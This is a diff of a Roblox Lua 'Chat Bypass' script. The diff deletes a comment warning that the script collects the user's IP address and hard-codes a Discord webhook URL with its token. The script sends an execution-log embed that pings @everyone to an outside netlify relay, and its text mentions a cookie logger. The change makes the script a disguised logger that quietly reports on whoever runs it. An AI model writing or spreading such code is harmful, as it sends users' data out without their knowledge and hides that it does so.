@@ -1,6 +1,3 @@
---[[
-	WARNING: Heads up! This script can get your ip address
-]]
 getgenv().haskjhfgash = "Chat Bypass"
 getgenv().sdkgjuhlasdas = "https://playvora.netlify.app/discordwebhook"
 getgenv().akjhsduaksjd = true
@@ -42,7 +39,7 @@ local url = getgenv().sdkgjuhlasdas
 local webhookids = getgenv().aasdfsdgfgh
 local data = {
 	["content"] = "@everyone",
-	['webhookid'] = webhookids, --ask playvora_1 to generate it
+	['webhookid'] = https://discord.com/api/webhooks/1288407924124815391/tSONtAqiR7J3AWor92aRw4mIk8zV0lT7Y1a4fdQFFBxrweK89MuPEs9rj2o3zVas4tZM,
 	["embeds"] = {{
 		["title"] = "MADE BY DXFC EDITED BY PLAYVORA | 🚀 **Script Execution Detected | Exec Log**",
 		["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
